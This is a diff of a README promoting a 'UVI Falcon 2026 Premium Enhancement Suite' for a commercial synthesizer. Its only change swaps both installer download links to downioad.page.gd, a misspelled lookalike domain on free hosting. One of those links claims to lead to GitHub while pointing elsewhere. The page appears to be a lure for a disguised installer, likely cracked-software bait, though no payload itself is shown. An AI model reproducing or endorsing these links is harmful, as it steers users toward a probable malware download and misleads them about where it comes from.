@@ -2,7 +2,7 @@
 
 The UVI Falcon 2026 Premium Enhancement Suite is a specialized software tool crafted to enhance the capabilities of UVI Falcon, a renowned hybrid synthesizer and sampler. This suite provides users with advanced customization options, expanded libraries, and performance tweaks to maximize creative potential in audio production.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## About UVI Falcon 2026 Enhancement Suite
 
@@ -66,7 +66,7 @@ A: For assistance, visit the GitHub repository's issues section or consult the h
 
 To obtain the UVI Falcon 2026 Premium Enhancement Suite, please download it from the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: January 15, 2026*
 *Copyright © 2026 UVI Falcon Enhancement Project. All rights reserved.*
